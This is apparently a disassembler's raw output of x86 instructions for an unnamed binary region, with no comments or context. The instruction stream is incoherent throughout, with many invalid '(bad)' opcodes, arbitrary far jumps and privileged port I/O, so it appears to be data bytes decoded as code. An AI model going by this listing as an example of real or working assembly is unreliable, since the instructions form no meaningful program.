  41c93a:	inc    edx
  41c93b:	nop
  41c93c:	lea    eax,[edi+0x71b0a4fc]
  41c942:	outs   dx,DWORD PTR ds:[esi]
  41c943:	cmp    al,0x32
  41c945:	cmp    ch,BYTE PTR [ecx-0xe083ce8]
  41c94b:	fldl2t 
  41c94d:	xchg   edx,eax
  41c94e:	lahf   
  41c94f:	dec    esp
  41c950:	aaa    
  41c951:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c952:	or     al,0xb8
  41c954:	(bad)
  41c959:	mov    ch,BYTE PTR [eax]
  41c95b:	in     al,0xd6
  41c95d:	push   edi
  41c95e:	or     BYTE PTR ds:0x67da7a0d,bh
  41c964:	(bad)  
  41c965:	xor    al,0xdc
  41c967:	mov    esp,0x5c9269c7
  41c96c:	and    ebx,DWORD PTR [esi-0x3e]
  41c96f:	push   cs
  41c970:	sti    
  41c971:	popa   
  41c972:	neg    BYTE PTR [edi+0x3d2489b4]
  41c978:	or     DWORD PTR [eax+ecx*2],edi
  41c97b:	mov    bl,0x2d
  41c97d:	inc    eax
  41c97e:	sbb    bh,ah
  41c980:	enter  0x196a,0x92
  41c984:	ficom  WORD PTR [edx-0x2cb8c81]
  41c98a:	clc    
  41c98b:	push   cs
  41c98c:	sar    BYTE PTR [ebx+0x51],0x32
  41c990:	or     eax,DWORD PTR [ebp-0x85cd7a4]
  41c996:	stos   BYTE PTR es:[edi],al
  41c997:	(bad)  
  41c998:	jg     0x41c957
  41c99a:	ss dec esi
  41c99c:	lea    edx,[ebx-0xe]
  41c99f:	int3   
  41c9a0:	cmp    al,0xc6
  41c9a2:	(bad)  
  41c9a3:	in     al,0x4d
  41c9a5:	pop    ds
  41c9a6:	jl     0x41c9b1
  41c9a8:	xor    al,0x8c
  41c9aa:	push   ebp
  41c9ab:	adc    al,0x1c
  41c9ad:	sub    esp,esi
  41c9af:	xor    ebp,DWORD PTR [ebp-0x2e]
  41c9b2:	rcl    DWORD PTR [edi+0x28],cl
  41c9b5:	(bad)  
  41c9b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9b7:	mov    edi,0xfd4d0a86
  41c9bc:	pop    ebx
  41c9bd:	and    esp,eax
  41c9bf:	enter  0x4b34,0x70
  41c9c3:	std    
  41c9c4:	sub    bh,ah
  41c9c6:	ret    0x5354
  41c9c9:	test   al,0xc5
  41c9cb:	mov    ds:0xfd1c2468,eax
  41c9d0:	ret    
  41c9d1:	and    BYTE PTR [ebx-0xea5a96d],bl
  41c9d7:	and    BYTE PTR [edx],al
  41c9d9:	les    edi,FWORD PTR [ebx]
  41c9db:	add    ch,al
  41c9dd:	ins    DWORD PTR es:[edi],dx
  41c9de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9df:	loop   0x41c989
  41c9e1:	jg     0x41ca42
  41c9e3:	ss mov bh,0x9d
  41c9e6:	pop    es
  41c9e7:	pop    es
  41c9e8:	(bad)  
  41c9ea:	xchg   esi,eax
  41c9eb:	xchg   DWORD PTR [edx-0x10],eax
  41c9ee:	or     DWORD PTR [esi+edi*4-0x36db61a8],ebx
  41c9f5:	stos   DWORD PTR es:[edi],eax
  41c9f6:	ds pop esp
  41c9f8:	std    
  41c9f9:	shl    DWORD PTR [ebx+0x20e7ebbd],1
  41c9ff:	imul   BYTE PTR [esi-0x30]
  41ca02:	test   BYTE PTR [ebx+edx*4+0x41369071],bh
  41ca09:	pusha  
  41ca0a:	xor    edi,ecx
  41ca0c:	add    edx,edi
  41ca0e:	pop    ecx
  41ca0f:	ins    BYTE PTR es:[edi],dx
  41ca10:	sub    edi,DWORD PTR fs:[ebx-0x66]
  41ca14:	fld    st(3)
  41ca16:	xchg   ebx,eax
  41ca17:	sub    DWORD PTR [edx+0x71324a07],ebx
  41ca1d:	xor    BYTE PTR [ebx+0x34e62b81],0x35
  41ca24:	inc    ebp
  41ca25:	stc    
  41ca26:	dec    ecx
  41ca27:	adc    eax,0x9324b622
  41ca2c:	jb     0x41caa3
  41ca2e:	xor    al,0xd6
  41ca30:	inc    esi
  41ca31:	add    bh,bh
  41ca33:	add    cl,BYTE PTR [edx+0x36]
  41ca36:	and    DWORD PTR [esi-0xb],eax
  41ca39:	ins    BYTE PTR es:[edi],dx
  41ca3a:	dec    esi
  41ca3b:	test   eax,0xa69e376f
  41ca40:	pop    edx
  41ca41:	mov    ?,WORD PTR [ecx+0x6578283f]
  41ca47:	lods   eax,DWORD PTR ds:[esi]
  41ca48:	dec    edi
  41ca49:	mov    edx,0xec269150
  41ca4e:	sbb    al,0xd7
  41ca50:	ss mov dh,0xdb
  41ca53:	and    DWORD PTR [ebx],eax
  41ca55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca56:	cmp    BYTE PTR [esp+ebx*1],ch
  41ca59:	mov    DWORD PTR [edx-0x91ba2aa],eax
  41ca5f:	sbb    ebx,esp
  41ca61:	sub    dh,ch
  41ca63:	imul   eax,DWORD PTR [esi+edx*8],0x680e1b9c
  41ca6a:	jnp    0x41ca08
  41ca6c:	pushf  
  41ca6d:	inc    DWORD PTR [ebx]
  41ca6f:	adc    BYTE PTR [ecx],ah
  41ca71:	fs lahf 
  41ca73:	xor    eax,0xd8a1328e
  41ca78:	push   0xe2445b1b
  41ca7d:	jae    0x41ca28
  41ca7f:	sbb    al,0xf5
  41ca81:	packsswb mm3,QWORD PTR [eax+0x32]
  41ca85:	mov    ah,0x95
  41ca87:	mov    bh,0x9c
  41ca89:	or     ebp,DWORD PTR [eax+0x24]
  41ca8c:	mov    BYTE PTR [ecx+0x5c0b3378],bh
  41ca92:	imul   edi,DWORD PTR [edi],0x4a443aa6
  41ca98:	(bad)  
  41ca99:	ss pop ecx
  41ca9b:	fidiv  WORD PTR [edx]
  41ca9d:	icebp  
  41ca9e:	retf   
  41ca9f:	test   dh,0x91
  41caa2:	inc    esp
  41caa3:	leave  
  41caa4:	or     ch,dl
  41caa6:	dec    esi
  41caa7:	arpl   WORD PTR [ebx-0x18],cx
  41caaa:	dec    ebx
  41caab:	adc    ch,BYTE PTR [edi+0x1a]
  41caae:	xchg   edx,eax
  41caaf:	and    BYTE PTR [esp+0x1319e28e],ch
  41cab6:	mov    dl,BYTE PTR [ebp-0x3427bbaa]
  41cabc:	push   ss
  41cabd:	cmp    DWORD PTR [esi+0x4b],0x13
  41cac1:	repz in eax,dx
  41cac3:	or     ecx,DWORD PTR [edx]
  41cac5:	inc    esi
  41cac6:	nop
  41cac7:	gs push ebp
  41cac9:	xchg   edx,eax
  41caca:	cmp    al,BYTE PTR [ebx+0x4297754b]
  41cad0:	xchg   DWORD PTR [esi-0x5bca806c],edx
  41cad6:	dec    edx
  41cad7:	sti    
  41cad8:	out    0x49,eax
  41cada:	and    bh,BYTE PTR [ebx-0x271f099]
  41cae0:	in     eax,0xd4
  41cae2:	pop    es
  41cae3:	out    dx,al
  41cae4:	jl     0x41cae0
  41cae6:	or     esi,DWORD PTR [ebx+0x55]
  41cae9:	pop    esi
  41caea:	xchg   esi,eax
  41caeb:	retf   
  41caec:	out    dx,eax
  41caed:	pop    es
  41caee:	call   0x6221:0x6b888cbf
  41caf5:	dec    edi
  41caf6:	push   edx
  41caf7:	int    0x8f
  41caf9:	les    ebx,FWORD PTR [ecx-0x2]
  41cafc:	fiadd  DWORD PTR [ecx-0x2f]
  41caff:	dec    esp
  41cb00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb01:	xor    DWORD PTR [edx+0x39],eax
  41cb04:	push   edx
  41cb05:	or     eax,0x6f337735
  41cb0a:	imul   ebp,edx,0x73704397
  41cb10:	popf   
  41cb11:	scas   al,BYTE PTR es:[edi]
  41cb12:	inc    edi
  41cb13:	ja     0x41cacb
  41cb15:	xor    BYTE PTR [edx-0x63dd1290],ah
  41cb1b:	pushf  
  41cb1c:	test   al,0x65
  41cb1e:	or     ch,bl
  41cb20:	pop    ds
  41cb21:	mov    bh,bh
  41cb23:	fsubr  st(0),st
  41cb25:	addr16 sbb al,0x9a
  41cb28:	and    BYTE PTR [edi+0x3bd07459],ah
  41cb2e:	lods   al,BYTE PTR ds:[esi]
  41cb2f:	ret    
  41cb30:	std    
  41cb31:	xchg   ebp,eax
  41cb32:	(bad)  
  41cb33:	jle    0x41cae8
  41cb35:	stos   DWORD PTR es:[edi],eax
  41cb36:	test   al,0x59
  41cb38:	js     0x41cb8a
  41cb3a:	push   ecx
  41cb3b:	std    
  41cb3c:	pop    esp
  41cb3d:	xchg   ebx,eax
  41cb3e:	xor    al,BYTE PTR [esi-0x2c]
  41cb41:	jmp    0x26b:0x2a54f218
  41cb48:	dec    edi
  41cb49:	lahf   
  41cb4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb4b:	sar    BYTE PTR [eax],1
  41cb4d:	out    dx,al
  41cb4e:	mov    esp,0x66832910
  41cb53:	test   eax,0xf446e2ba
  41cb58:	pop    esp
  41cb59:	mov    BYTE PTR [edx-0x259d4290],dl
  41cb5f:	xor    al,bh
  41cb61:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41cb63:	(bad)  
  41cb65:	inc    ebp
  41cb66:	xchg   edi,eax
  41cb67:	sub    eax,0x8439ce3e
  41cb6c:	inc    edx
  41cb6d:	or     al,0xb7
  41cb6f:	pop    ss
  41cb70:	cdq    
  41cb71:	inc    edi
  41cb72:	leave  
  41cb73:	cli    
  41cb74:	sub    BYTE PTR [ebp-0x1972eeba],bl
  41cb7a:	jl     0x41cb7a
  41cb7c:	(bad)  
  41cb7d:	mov    eax,ds:0x7fa842a8
  41cb82:	js     0x41cb76
  41cb84:	pop    ebx
  41cb85:	or     DWORD PTR [edx+0x251021e4],eax
  41cb8b:	pop    edi
  41cb8c:	int    0xe6
  41cb8e:	stos   DWORD PTR es:[edi],eax
  41cb8f:	pop    eax
  41cb90:	sbb    eax,DWORD PTR [eax+0x1c]
  41cb93:	pop    ds
  41cb94:	add    esi,DWORD PTR [ebx]
  41cb96:	fisttp QWORD PTR [edx+0x3d91b3a6]
  41cb9c:	fst    DWORD PTR [eax+0x5]
  41cb9f:	bound  ecx,QWORD PTR [esi]
  41cba1:	xchg   ebx,eax
  41cba2:	pop    ecx
  41cba3:	and    edi,DWORD PTR [ebp+ecx*2-0x503cabe]
  41cbaa:	adc    ebp,ecx
  41cbac:	jo     0x41cc20
  41cbae:	ret    0x65b
  41cbb1:	sbb    bh,BYTE PTR [ebp-0x5027cbf5]
  41cbb7:	ss iret 
  41cbb9:	xchg   esp,eax
  41cbba:	add    ch,BYTE PTR ds:0x67e0c7c2
  41cbc0:	pop    edi
  41cbc1:	call   0xef85:0x7c13e232
  41cbc8:	jmp    0x4445eabb
  41cbcd:	jmp    0x96195aa
  41cbd2:	mov    bh,0x38
  41cbd4:	ja     0x41cb84
  41cbd6:	xchg   DWORD PTR [eax+ecx*1+0x2b7eac21],esi
  41cbdd:	mov    al,BYTE PTR [eax-0x7d]
  41cbe0:	xor    eax,0xcad32ea7
  41cbe5:	inc    ebp
  41cbe6:	jb     0x41cbe6
  41cbe8:	cmp    esi,DWORD PTR [ebp+edx*2+0x18a6869e]
  41cbef:	push   es
  41cbf0:	(bad)  
  41cbf1:	repnz push es
  41cbf3:	pushf  
  41cbf4:	cmp    ebx,DWORD PTR [esi+0x75]
  41cbf7:	cmp    al,0xfe
  41cbf9:	and    eax,DWORD PTR [esi+edi*2+0x41728c2d]
  41cc00:	shl    DWORD PTR [edx+ebx*4],0x70
  41cc04:	add    DWORD PTR [ecx-0x14376a61],esp
  41cc0a:	int    0x10
  41cc0c:	imul   eax,DWORD PTR [ecx+0x6cd0e4e8],0xe0ae018a
  41cc16:	add    eax,0xda5d7bd6
  41cc1b:	xor    dh,BYTE PTR [esi+edi*4+0xa]
  41cc1f:	mov    dl,0x92
  41cc21:	jbe    0x41cc5b
  41cc23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc24:	stos   DWORD PTR es:[edi],eax
  41cc25:	ins    DWORD PTR es:[edi],dx
  41cc26:	mov    edx,0x635ba5d2
  41cc2b:	in     al,dx
  41cc2c:	out    0xda,al
  41cc2e:	fwait
  41cc2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc30:	inc    ebx
  41cc31:	cmp    al,0x7c
  41cc33:	and    dh,BYTE PTR [esi-0x546a3599]
  41cc39:	int    0x66
  41cc3b:	mov    ecx,0xad4ef556
  41cc40:	add    al,0x56
  41cc42:	push   edx
  41cc43:	lods   eax,DWORD PTR ds:[esi]
  41cc44:	xor    cl,BYTE PTR [esi+eax*8]
  41cc47:	xlat   BYTE PTR ds:[ebx]
  41cc48:	repnz xor eax,DWORD PTR [ebx]
  41cc4b:	or     DWORD PTR [bp+di-0x2478],0xc3fa5a12
  41cc54:	cmp    eax,0xe215597c
  41cc59:	sbb    DWORD PTR [edi+0x65],ecx
  41cc5c:	retf   0x736e
  41cc5f:	frstor [ebp+0x65648104]
  41cc65:	jnp    0x41cc83
  41cc67:	pop    ebp
  41cc68:	jnp    0x41ccbe
  41cc6a:	push   edi
  41cc6b:	cmp    eax,0xe53c9c90
  41cc70:	jle    0x41cc5d
  41cc72:	div    DWORD PTR [esp+edx*4]
  41cc75:	(bad)  
  41cc76:	pop    edx
  41cc77:	aad    0x7f
  41cc79:	ror    bh,1
  41cc7b:	mov    ah,0xd5
  41cc7d:	jle    0x41cc1e
  41cc7f:	popf   
  41cc80:	ss repnz inc ebp
  41cc83:	(bad)  
  41cc84:	sub    al,0x5
  41cc86:	jl     0x41ccd5
  41cc88:	stc    
  41cc89:	icebp  
  41cc8a:	adc    eax,0x9b87f8d3
  41cc8f:	push   esp
  41cc90:	loop   0x41cd06
  41cc92:	inc    esp
  41cc93:	adc    BYTE PTR [esi],bh
  41cc95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc97:	cmp    eax,0x4cef0756
  41cc9c:	mov    ds:0xb1bde296,eax
  41cca1:	aas    
  41cca2:	pop    edx
  41cca3:	push   esi
  41cca4:	bound  ebx,QWORD PTR es:[ebx-0x6ba27433]
  41ccab:	pop    ebp
  41ccac:	mov    es,WORD PTR [edi+0x7793193]
  41ccb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ccb3:	cmp    eax,0x3b84bb69
  41ccb8:	popf   
  41ccb9:	or     ch,BYTE PTR [esi+0x65]
  41ccbc:	jecxz  0x41cca3
  41ccbe:	aas    
  41ccbf:	push   0xffffff9c
  41ccc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ccc2:	fs ins BYTE PTR es:[edi],dx
  41ccc4:	adc    eax,0x85444f1a
  41ccc9:	jmp    0x50e:0x24ad5131
  41ccd0:	sub    ecx,ecx
  41ccd2:	lahf   
  41ccd3:	sar    BYTE PTR ds:0xf33e7192,1
  41ccd9:	sahf   
  41ccda:	dec    edi
  41ccdb:	sub    ebp,0x42961aa1
  41cce1:	stc    
  41cce2:	pop    ebp
  41cce3:	outs   dx,BYTE PTR ds:[esi]
  41cce4:	loope  0x41cd21
  41cce6:	push   eax
  41cce7:	cmp    DWORD PTR [edx+0x4b29e3bf],edi
  41cced:	loope  0x41cc89
  41ccef:	sbb    bh,BYTE PTR [ebx+eax*4]
  41ccf2:	jg     0x41cd00
  41ccf4:	popa   
  41ccf5:	call   0xcc8eaa12
  41ccfa:	mov    ebp,0x287b8b50
  41ccff:	into   
  41cd00:	popa   
  41cd01:	ret    
  41cd02:	push   0x7ad5057b
  41cd07:	mov    ecx,0x37063aff
  41cd0c:	dec    ecx
  41cd0d:	adc    eax,0x35669360
  41cd12:	push   esi
  41cd13:	gs pop ds
  41cd15:	dec    esp
  41cd16:	sub    BYTE PTR [ebx+esi*1+0x6dd97c65],0x24
  41cd1e:	out    0xb9,eax
  41cd20:	add    ebp,eax
  41cd22:	mov    WORD PTR [eax+eax*8-0x4f],fs
  41cd26:	outs   dx,BYTE PTR ds:[esi]
  41cd27:	xchg   ebx,eax
  41cd28:	sti    
  41cd29:	push   0xbfddae03
  41cd2e:	int3   
  41cd2f:	jne    0x41cd9f
  41cd31:	cmp    DWORD PTR [esp+eax*4-0x47],ebx
  41cd35:	aam    0xd4
  41cd37:	lea    esi,[ebp+0x5cccae59]
  41cd3d:	into   
  41cd3e:	lods   eax,DWORD PTR fs:[esi]
  41cd40:	inc    ecx
  41cd41:	push   esp
  41cd42:	(bad)  
  41cd43:	out    0x81,eax
  41cd45:	jo     0x41ccd8
  41cd47:	test   esp,ebx
  41cd49:	xor    ebx,ebp
  41cd4b:	xchg   edx,eax
  41cd4c:	lock add dl,ch
  41cd4f:	clc    
  41cd50:	pop    ds
  41cd51:	cli    
  41cd52:	lea    edx,[esi-0x39]
  41cd55:	add    al,0x7c
  41cd57:	jns    0x41cd79
  41cd59:	add    esp,DWORD PTR [ebx-0x57]
  41cd5c:	clc    
  41cd5d:	rcr    dl,0x4e
  41cd60:	shl    BYTE PTR [edi+0x4508bcb3],cl
  41cd66:	push   0xffffff85
  41cd68:	data16 arpl WORD PTR [eax+0xd],dx
  41cd6c:	in     eax,dx
  41cd6d:	push   esi
  41cd6e:	cmp    edi,DWORD PTR [edi+0x69]
  41cd71:	imul   ecx,DWORD PTR [ebx+0x650420a5],0xb7fb756b
  41cd7b:	test   eax,0x94de8b80
  41cd80:	mov    edx,ebx
  41cd82:	fild   WORD PTR [ebp-0xb84253e]
  41cd88:	lds    edx,FWORD PTR [ebp-0x354f3dcd]
  41cd8e:	retf   0xd450
  41cd91:	ss (bad) 
  41cd93:	shl    BYTE PTR [esi+0x12],1
  41cd96:	mov    cl,0xfe
  41cd98:	mov    ebp,0xe881a5a7
  41cd9d:	pop    ebp
  41cd9e:	loopne 0x41cde5
  41cda0:	retf   0xdbf9
  41cda3:	xor    al,0x46
  41cda5:	stos   DWORD PTR es:[edi],eax
  41cda6:	inc    ebx
  41cda7:	pop    edx
  41cda8:	dec    BYTE PTR ds:0xa19ae6fa
  41cdae:	sbb    al,0xdc
  41cdb0:	push   edx
  41cdb1:	dec    cx
  41cdb3:	dec    eax
  41cdb4:	push   esp
  41cdb5:	or     ch,BYTE PTR [esi+edi*8+0x522cda44]
  41cdbc:	sub    eax,0x99ef8f50
  41cdc1:	add    DWORD PTR [esi+0x3e],eax
  41cdc4:	dec    ecx
  41cdc5:	mov    edi,0x1021fd80
  41cdca:	add    esp,DWORD PTR [edx]
  41cdcc:	into   
  41cdcd:	sub    ch,BYTE PTR [ebx+0x57]
  41cdd0:	icebp  
  41cdd1:	enter  0xf694,0xc3
  41cdd5:	stc    
  41cdd6:	ret    0x579f
  41cdd9:	scas   al,BYTE PTR es:[edi]
  41cdda:	and    eax,0x216d40ca
  41cddf:	mov    al,ds:0x226760db
  41cde4:	shr    BYTE PTR [edi+0x1564da3d],cl
  41cdea:	sti    
  41cdeb:	adc    BYTE PTR [ecx-0x21],dh
  41cdee:	xor    DWORD PTR [esi],eax
  41cdf0:	jns    0x41cda2
  41cdf2:	lahf   
  41cdf3:	outs   dx,DWORD PTR ds:[esi]
  41cdf4:	mov    edx,0x8f6516c
  41cdf9:	and    bl,BYTE PTR [esi-0x3795a1ce]
  41cdff:	aaa    
  41ce00:	or     edx,ebx
  41ce02:	das    
  41ce03:	sub    dl,BYTE PTR [esi+0x1e17a968]
  41ce09:	inc    edi
  41ce0a:	push   ss
  41ce0b:	aaa    
  41ce0c:	pop    es
  41ce0d:	pusha  
  41ce0e:	div    DWORD PTR [ebx-0x41]
  41ce11:	or     al,0x96
  41ce13:	sub    eax,0x17ea6a48
  41ce18:	jmp    0x41cda8
  41ce1a:	retf   
  41ce1b:	inc    BYTE PTR [ecx+0x55]
  41ce1e:	lea    eax,[eax-0x4]
  41ce21:	or     BYTE PTR [ebx-0x11],al
  41ce24:	mov    eax,0x7bac544d
  41ce29:	rol    BYTE PTR [esi],1
  41ce2b:	jne    0x41cde7
  41ce2d:	dec    eax
  41ce2e:	cmc    
  41ce2f:	sbb    al,0xb7
  41ce31:	cmc    
  41ce32:	push   ss
  41ce33:	sahf   
  41ce34:	mov    ecx,DWORD PTR ds:0xb98cb912
  41ce3a:	daa    
  41ce3b:	pop    ebx
  41ce3c:	or     ch,BYTE PTR [ebx+0x77df826d]
  41ce42:	repnz mov WORD PTR [edi+ebx*4+0x5ea8f179],fs
  41ce4a:	xchg   edx,eax
  41ce4b:	(bad)  
  41ce4c:	or     eax,0x59171d2c
  41ce51:	jecxz  0x41ceab
  41ce53:	leave  
  41ce54:	imul   esi,esi,0xbcce2e3c
  41ce5a:	fwait
  41ce5b:	pop    esi
  41ce5c:	xchg   esp,eax
  41ce5d:	ror    BYTE PTR [ecx],1
  41ce5f:	ds mov dh,0x29
  41ce62:	jns    0x41ce47
  41ce64:	and    dl,BYTE PTR [esi]
  41ce66:	les    ebp,FWORD PTR [ebx]
  41ce68:	aas    
  41ce69:	dec    esp
  41ce6a:	and    DWORD PTR [eax],ebp
  41ce6c:	mov    bh,0xb8
  41ce6e:	sub    DWORD PTR [eax],0x65dddfa
  41ce74:	test   DWORD PTR [ebp+0x3b],ebx
  41ce77:	push   edx
  41ce78:	inc    ebx
  41ce79:	mov    DWORD PTR [ebp+0x3f05b0be],esi
  41ce7f:	dec    eax
  41ce80:	pop    edi
  41ce81:	icebp  
  41ce82:	call   0x7e05:0x39eb9574
  41ce89:	inc    eax
  41ce8a:	fidivr DWORD PTR [esi-0x4bd876cb]
  41ce90:	das    
  41ce91:	bound  esi,QWORD PTR [esi+0x15c51a98]
  41ce97:	daa    
  41ce98:	dec    ecx
  41ce99:	push   ebx
  41ce9a:	icebp  
  41ce9b:	cmp    ch,BYTE PTR [edi+ecx*1+0x2f46739e]
  41cea2:	cmp    DWORD PTR [ecx],eax
  41cea4:	aam    0x5f
  41cea6:	aaa    
  41cea7:	hlt    
  41cea8:	or     DWORD PTR [edx],ebp
  41ceaa:	aad    0xb2
  41ceac:	pop    eax
  41cead:	push   eax
  41ceae:	repz shr BYTE PTR [edi-0x6b7ac2e4],0xb9
  41ceb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ceb7:	sbb    BYTE PTR [edx-0x59],0x84
  41cebb:	vprotw ymm1,xmm3,[ebx-0x684c536f]
  41cec4:	or     ch,BYTE PTR [ecx-0x46]
  41cec7:	pop    edx
  41cec8:	xor    BYTE PTR [edx-0xa],cl
  41cecb:	inc    esi
  41cecc:	stos   BYTE PTR es:[edi],al
  41cecd:	push   ss
  41cece:	push   ss
  41cecf:	push   ds
  41ced0:	cmp    BYTE PTR [edi+0x6d],0x54
  41ced4:	xor    ch,dh
  41ced6:	pop    ebp
  41ced7:	ss pop esi
  41ced9:	aam    0xdf
  41cedb:	sahf   
  41cedc:	push   0x3a
  41cede:	aad    0x9a
  41cee0:	or     al,0x44
  41cee2:	xor    edi,ecx
  41cee4:	leave  
  41cee5:	mov    ds:0xc3a100d9,eax
  41ceea:	and    al,0x40
  41ceec:	mov    ?,WORD PTR [esi-0x19697324]
  41cef2:	xlat   BYTE PTR ds:[ebx]
  41cef3:	xchg   ebx,eax
  41cef4:	jg     0x41cf26
  41cef6:	jne    0x41ceb3
  41cef8:	lods   al,BYTE PTR ds:[esi]
  41cef9:	ret    
  41cefa:	inc    ecx
  41cefb:	or     eax,0x54352461
  41cf00:	cmp    dh,BYTE PTR [ecx]
  41cf02:	imul   edi,DWORD PTR [edi],0xffffffc8
  41cf05:	jp     0x41ce90
  41cf07:	int    0xdf
  41cf09:	push   ecx
  41cf0a:	adc    BYTE PTR [edi-0x7d175f32],ch
  41cf10:	mov    al,0x30
  41cf12:	pop    ss
  41cf13:	daa    
  41cf14:	jle    0x41cf22
  41cf16:	rcl    esp,cl
  41cf18:	das    
  41cf19:	mov    dh,0x97
  41cf1b:	mov    DWORD PTR [eax],ecx
  41cf1d:	imul   DWORD PTR [ebx+0x60]
  41cf20:	pushf  
  41cf21:	jge    0x41cf28
  41cf23:	mov    ebp,0xe6a11370
  41cf28:	add    al,0x8
  41cf2a:	mov    ch,0xd
  41cf2c:	cmp    al,0x22
  41cf2e:	leave  
  41cf2f:	sub    bh,al
  41cf31:	fbstp  TBYTE PTR [ebp+0x5ebad17d]
  41cf37:	mov    edx,0x4823a8ff
  41cf3c:	pop    es
  41cf3d:	pop    eax
  41cf3e:	and    cl,BYTE PTR [eax]
  41cf40:	out    0x33,al
  41cf42:	push   edx
  41cf43:	imul   ebp,DWORD PTR [eax-0x25],0xc
  41cf47:	pushf  
  41cf48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf4a:	inc    esp
  41cf4b:	push   ss
  41cf4c:	sbb    esi,esp
  41cf4e:	js     0x41cf42
  41cf50:	fmulp  st(3),st
  41cf52:	cmp    esp,esp
  41cf54:	jge    0x41cf2e
  41cf56:	or     al,0x72
  41cf58:	in     eax,dx
  41cf59:	sbb    eax,0xb9a5ad8b
  41cf5e:	adc    BYTE PTR [ebx+ecx*2],bh
  41cf61:	(bad)  
  41cf62:	repz pusha 
  41cf64:	add    ebp,DWORD PTR [edi+0x41]
  41cf67:	daa    
  41cf68:	push   ss
  41cf69:	jge    0x41cf57
  41cf6b:	sbb    BYTE PTR [ebx+0x7e8e58fa],ch
  41cf71:	add    bh,BYTE PTR [edi-0x1e3e3e7b]
  41cf77:	xchg   ebx,eax
  41cf78:	lock mov bh,0x53
  41cf7b:	in     eax,0xb9
  41cf7d:	and    eax,0x6d2cf40a
  41cf82:	in     eax,dx
  41cf83:	or     eax,0x96f527c8
  41cf88:	inc    esp
  41cf89:	ins    BYTE PTR es:[edi],dx
  41cf8a:	enter  0xd877,0xa3
  41cf8e:	sbb    DWORD PTR [ecx],eax
  41cf90:	jge    0x41cfa1
  41cf92:	ins    DWORD PTR es:[edi],dx
  41cf93:	icebp  
  41cf94:	push   es
  41cf95:	fucom  st(5)
  41cf97:	or     ah,BYTE PTR [ecx]
  41cf99:	ds xchg edi,eax
  41cf9b:	xor    al,0xfa
  41cf9d:	sbb    al,0x81
  41cf9f:	mov    edi,DWORD PTR [ebx]
  41cfa1:	(bad)  
  41cfa2:	(bad)
  41cfa5:	sbb    cl,BYTE PTR [ecx+esi*8]
  41cfa8:	stc    
  41cfa9:	dec    ecx
  41cfaa:	and    BYTE PTR [ebx-0x6d],ch
  41cfad:	cmp    al,0xfe
  41cfaf:	(bad)  
  41cfb0:	pop    ebp
  41cfb1:	clc    
  41cfb2:	sbb    eax,0x1dbad93d
  41cfb7:	mov    edi,0x7138bb04
  41cfbc:	bound  esp,QWORD PTR [ebx]
  41cfbe:	sahf   
  41cfbf:	sar    ebp,1
  41cfc1:	or     eax,0x608470ad
  41cfc6:	ret    
  41cfc7:	lock adc al,0xa1
  41cfca:	bound  eax,QWORD PTR [esi+0x3c]
  41cfcd:	mov    edi,0x714c406b
  41cfd2:	loope  0x41d045
  41cfd4:	vminss xmm2,xmm3,DWORD PTR [esp+ebp*2-0x6b5e4234]
  41cfdd:	jmp    0x2da032ce
  41cfe2:	gs push eax
  41cfe4:	or     BYTE PTR [ecx+edx*8+0x6c],ah
  41cfe8:	jge    0x41d00d
  41cfea:	sub    ebx,DWORD PTR [ecx]
  41cfec:	neg    DWORD PTR [esi]
  41cfee:	xchg   BYTE PTR [ecx-0x14],bl
  41cff1:	mov    ecx,ebp
  41cff3:	jecxz  0x41cf92
  41cff5:	addr16 mov edx,0x72ae5fa8
  41cffb:	in     eax,dx
  41cffc:	sub    al,0xf2
  41cffe:	pop    esi
  41cfff:	idiv   edi
  41d001:	push   edi
  41d002:	adc    BYTE PTR [esi+ebp*1],cl
  41d005:	jp     0x41d011
  41d007:	mov    dl,BYTE PTR [esi]
  41d009:	clc    
  41d00a:	xlat   BYTE PTR ds:[ebx]
  41d00b:	pop    ebp
  41d00c:	neg    BYTE PTR [esi*8-0x6075cceb]
  41d013:	repz cdq 
  41d015:	out    dx,al
  41d016:	jmp    0x1e26:0xc2c50562
  41d01d:	and    dh,bh
  41d01f:	mov    edx,0xe66defec
  41d024:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d026:	int    0x29
  41d028:	fwait
  41d029:	adc    DWORD PTR [esi+0x757ea98d],edi
  41d02f:	pop    ecx
  41d030:	arpl   WORD PTR [ebx+0x70],si
  41d033:	outs   dx,BYTE PTR ds:[esi]
  41d034:	push   eax
  41d035:	and    BYTE PTR [edx-0x2eba2814],dl
  41d03b:	jae    0x41d06e
  41d03d:	xor    al,0x85
  41d03f:	mov    ecx,cs
  41d041:	jp     0x41cfd0
  41d043:	xchg   BYTE PTR [esp+edi*2+0x2a08fcc8],dl
  41d04a:	aas    
  41d04b:	mov    DWORD PTR [edi],edi
  41d04d:	(bad)  
  41d04e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d04f:	jbe    0x41d048
  41d051:	std    
  41d052:	les    ebp,FWORD PTR [eax+ebp*1+0x426522db]
  41d059:	add    DWORD PTR [ebp-0x4cdf8f74],ecx
  41d05f:	and    ah,dl
  41d061:	mov    esp,0x78f4f33
  41d066:	xor    bh,BYTE PTR [esi+0x284e72fd]
  41d06c:	je     0x41d0a7
  41d06e:	rcr    ah,cl
  41d070:	call   0x36e8:0xa9c5069e
  41d077:	aas    
  41d078:	or     bh,BYTE PTR [esi+ebx*1]
  41d07b:	mov    esp,0x5559e2d0
  41d080:	cvtsi2ss xmm5,DWORD PTR cs:[edx]
  41d085:	push   ebp
  41d086:	mov    ah,0x58
  41d088:	sbb    eax,0xb2a9aafe
